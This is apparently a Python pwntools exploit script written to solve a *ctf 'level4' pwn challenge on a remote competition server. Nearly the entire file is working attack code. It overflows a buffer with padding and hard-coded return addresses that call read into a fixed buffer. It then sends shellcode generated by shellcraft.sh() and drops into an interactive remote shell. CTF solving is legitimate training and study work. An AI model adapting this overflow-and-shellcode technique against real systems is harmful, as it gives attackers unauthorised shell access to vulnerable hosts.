#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
to slove *ctf level4 
"""
from pwn import *

r = remote("pwn.sixstars.team","22004")

start_s = r.recv()
print start_s

sh= asm(shellcraft.sh())

read_addr = p32(0x80480fd)
buff_addr = p32(0x8049100)
payload = 'a'*0x30  + read_addr +buff_addr + p32(0) + buff_addr + p32(0x100)
pay2 = payload  + 'a'*(0x80-len(payload))
r.send(pay2)

s = r.recv()
print s

r.send(sh+ 'a'*(0x100-len(sh)))
r.sendline(sh)
print sh
r.interactive()
